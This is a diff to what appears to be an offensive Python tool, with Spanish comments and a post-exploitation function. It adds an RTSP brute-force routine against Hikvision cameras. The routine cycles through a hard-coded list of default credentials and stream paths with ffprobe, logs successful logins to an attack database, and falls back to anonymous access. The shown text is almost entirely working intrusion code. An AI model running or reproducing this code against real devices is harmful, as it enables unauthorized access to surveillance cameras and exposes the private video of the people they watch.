@@ -3866,8 +3866,49 @@ def post_explotacion():
                 break
 
         if not active_port:
-            warn(f"No se pudo conectar al puerto HTTP de {ip} (80/8000/8080). Cámara sin acceso web activo.")
-            return False
+            warn(f"Sin acceso HTTP (80/8000/8080) — intentando RTSP brute force en puerto 554...")
+            # Brute force RTSP con credenciales por defecto Hikvision
+            rtsp_creds = [
+                ("admin","12345"),("admin","admin"),("admin",""),("admin","123456"),
+                ("admin","password"),("admin","hikvisionsys"),("admin","hik12345"),
+                ("guest","guest"),("user","user"),("root","12345"),
+            ]
+            rtsp_paths = [
+                "/Streaming/Channels/101",
+                "/Streaming/Channels/1",
+                "/h264/ch1/main/av_stream",
+                "/cam/realmonitor?channel=1&subtype=0",
+            ]
+            rtsp_ok = False
+            for _u, _p in rtsp_creds:
+                for _path in rtsp_paths[:2]:
+                    rtsp_url = f"rtsp://{_u}:{_p}@{ip}:554{_path}"
+                    result_r = run(
+                        f"timeout 5 ffprobe -v quiet -rtsp_transport tcp "
+                        f"-i '{rtsp_url}' 2>&1 | head -5",
+                        capture=True
+                    ) or ""
+                    if result_r and "error" not in result_r.lower() and "refused" not in result_r.lower():
+                        ok(f"RTSP ACCESIBLE: {rtsp_url}")
+                        ok(f"Credenciales válidas: {_u}:{_p}")
+                        db_log_attack("Hikvision RTSP BruteForce", ip, "", "", f"{_u}:{_p} → {_path}")
+                        rtsp_ok = True
+                        break
+                if rtsp_ok:
+                    break
+            if not rtsp_ok:
+                # Intentar acceso anónimo
+                anon_url = f"rtsp://{ip}:554/Streaming/Channels/101"
+                result_anon = run(
+                    f"timeout 5 ffprobe -v quiet -rtsp_transport tcp -i '{anon_url}' 2>&1 | head -5",
+                    capture=True
+                ) or ""
+                if result_anon and "401" not in result_anon and "refused" not in result_anon.lower():
+                    ok(f"RTSP ANONIMO accesible: {anon_url}")
+                    db_log_attack("Hikvision RTSP", ip, "", "", "acceso anónimo")
+                else:
+                    warn(f"RTSP requiere credenciales no encontradas. Cámara protegida.")
+            return rtsp_ok
 
         if "200" in resp or "OK" in resp:
             ok(f"PAYLOAD ENVIADO en puerto {active_port} — verificando ejecución en {ip}...")
